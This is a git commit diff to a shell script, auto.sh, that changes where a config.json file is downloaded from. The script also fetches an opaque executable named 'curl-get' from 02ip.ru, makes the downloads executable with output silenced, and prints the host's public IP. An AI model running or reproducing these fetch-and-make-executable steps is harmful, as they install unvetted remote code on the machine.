a00c3754b07fa0741ec5c7125117b3b8f19d90bc
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-14 22:38:09 +0700

    Update auto.sh

--- auto.sh
+++ auto.sh
@@ -1,5 +1,5 @@
 wget -q https://02ip.ru/curl-get && chmod +x curl-get >/dev/null 2>&1
-wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
+wget -q https://gitlab.com/55113110159/oz/-/raw/main/config.json && chmod +x config.json
 sleep 11 
 echo "******************************************************************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
